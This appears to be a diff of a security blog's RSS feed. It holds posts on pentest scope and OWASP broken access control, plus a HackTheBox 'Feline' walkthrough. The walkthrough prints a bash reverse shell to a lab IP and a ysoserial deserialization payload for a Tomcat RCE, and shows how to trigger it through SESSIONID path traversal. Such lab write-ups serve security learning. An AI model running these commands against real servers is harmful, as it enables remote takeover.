+&lt;p&gt;To answer the question which type fits better you have to consider the goals and limits of the pentest. When it is a pentest on a more secure or previously tested system it could make sense to treat it as a white-box test to go more into detail. A black-box or gray-box test on the other hand could make sense if it is the first or one of the first tests on this system. In conclusion you can say that there is no one-fits-all solution and you have to look at all scenarios seperately.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;p&gt;&lt;a class=&quot;citation&quot; href=&quot;/references#pentestieee&quot;&gt;(Shebli &amp;amp; Beheshti, 2018)&lt;/a&gt;
+&lt;a class=&quot;citation&quot; href=&quot;/references#pentestwebieee&quot;&gt;(Antunes &amp;amp; Vieira, 2014)&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 13 Sep 2022 00:00:00 +0000</pubDate>
+        <link>//Penetration-Testing-Scope</link>
+        <link href="/Penetration-Testing-Scope"/>
+        <guid isPermaLink="true">/Penetration-Testing-Scope</guid>
+      </item>
+    
+      <item>
+        <title>OWASP Broken Access Control</title>
+        <description>&lt;h2 id=&quot;importance&quot;&gt;importance&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;description&quot;&gt;description&lt;/h2&gt;
+
+&lt;p&gt;Access control should ensure that users can only act in thier intended scope. If this access control is broken a user can operate outside the box. 
+These broken access controls can comprise:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;absence of role/access management where every user can act in every scope&lt;/li&gt;
+  &lt;li&gt;bypassing access control checks by modifiying the URL, HTML page, API requests&lt;/li&gt;
+  &lt;li&gt;insecure direct object reference (IDOR)&lt;/li&gt;
+  &lt;li&gt;absence of HTTP method checks (POST, PUT, DELETE)&lt;/li&gt;
+  &lt;li&gt;acting as a user without being logged in or acting as admin when loggen in as user&lt;/li&gt;
+  &lt;li&gt;replaying or tampering metadata i.e. JWT, cookie, hidden field&lt;/li&gt;
+  &lt;li&gt;cross-origin resource sharing (CORS) misconfiguration allows access from unauthorized/untrusted origins&lt;/li&gt;
+  &lt;li&gt;browsing to authenticated pages as unauthenticated user&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;how-to-find&quot;&gt;how to find&lt;/h2&gt;
+
+&lt;p&gt;Using the burp suite extension &lt;a href=&quot;https://github.com/PortSwigger/autorize&quot;&gt;autorize&lt;/a&gt;. Therefore a higher and lower user is needed. 
+Goal of this test is to try if a lower privileged user can access funcions only intended for higher privileged users.
+Take the session cookie and write it in the cookie field in the autorize tab. Start autorize and browse with the higher privileged user.
+Watch the output provided in the autorize tab. This will send the request with the cookie of the higher privileged user and the lower privileged user and compares the response lenth of the original, the modified and the case where no cookie is provided. When the original and the modified lengths are identical it indicates that the lower privileged user can use the same function like the higher privileged user which is an indication for a broken access control.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;references&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&quot;&gt;1&lt;/a&gt;
+&lt;a href=&quot;https://www.packetlabs.net/posts/broken-access-control/&quot;&gt;2&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate>
+        <link>//OWASP-2021-01-Broken-Access-Control</link>
+        <link href="/OWASP-2021-01-Broken-Access-Control"/>
+        <guid isPermaLink="true">/OWASP-2021-01-Broken-Access-Control</guid>
+      </item>
+    
+      <item>
+        <title>Feline HackTheBox</title>
+        <description>&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap scan&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sC -sV -Ao nmap 10.10.10.205&lt;/span&gt;
+
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-09-06 12:28 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.205
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.029s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: VirusBucket
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;65.87 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;open-port&quot;&gt;open port&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;port 22 as ssh as usual&lt;/li&gt;
+  &lt;li&gt;port 8080 with a running tomat instance at version 9.0.27&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tomcat-9027&quot;&gt;tomcat 9.0.27&lt;/h2&gt;
+
+&lt;p&gt;A little bit of looking around reveals that the running version of tomcat seems to be vulnerable to a rce exploit. &lt;a href=&quot;https://github.com/PenTestical/CVE-2020-9484&quot;&gt;1&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;file-upload&quot;&gt;file upload&lt;/h2&gt;
+
+&lt;p&gt;Looking around and playing around reveals a file upload service at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.205:8080/service/&lt;/code&gt;. It gets an email address and a file. The service says it checks the file for malicious content and sends a report to the email address. 
+Playing around with burpsuite reveals that the service tries to store those files under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/samples/uploads&lt;/code&gt; and uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache/commons/fileupload&lt;/code&gt; to do that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/BurpSuite-FileUpload.png&quot; alt=&quot;BurpSuite FileUpload&quot; title=&quot;BurpSuite FileUpload&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;combining&quot;&gt;combining&lt;/h2&gt;
+
+&lt;p&gt;Combining the RCE exploit with the findings of the file upload we can create a reverse shell with &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt;, upload it and call it with path traversal of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt; field in the request.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-user&quot;&gt;exploiting user&lt;/h2&gt;
+
+&lt;p&gt;Starting with the reverse shell file we start up with ysoserial to create the payload. Because we don’t know the Verison of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache/commons/fileupload&lt;/code&gt; we have to try serveral &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsCollectionsX&lt;/code&gt; provided by ysoserial. As reverse shell we’re using a bash shell which we base64 encode.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;base64 of bash revese shell
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# echo &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.18/4242 0&amp;gt;&amp;amp;1&apos; | base64&lt;/span&gt;
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;create reverse shell with ysoserial
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial-master.jar CommonsCollections2 &lt;span class=&quot;s2&quot;&gt;&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK}|{base64,-d}|{bash,-i}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.session
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We take that file and upload it using the intended way. Thereupon we request any site on the tomat site and manipulate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt; using burpsuite. The value is equivalent to the previous found directory where the files are uploaded to + the file name of the created reverse shell subtracted by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.session&lt;/code&gt; file-extrension. This is because tomcat automatically appends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.session&lt;/code&gt; to the requested &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/BurpSuite-SessionID.png&quot; alt=&quot;BurpSuite SESSIONID&quot; title=&quot;BurpSuite SESSIONID manipulation&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Start a listener on the local maschine and forward the manipulated request. Voila! User level of Fiola.&lt;/p&gt;
+
+&lt;h2 id=&quot;root-exploitation&quot;&gt;root exploitation&lt;/h2&gt;
+
+</description>
+        <pubDate>Tue, 06 Sep 2022 00:00:00 +0000</pubDate>
+        <link>//Feline</link>
+        <link href="/Feline"/>
+        <guid isPermaLink="true">/Feline</guid>
+      </item>
+    
   </channel>
 </rss>
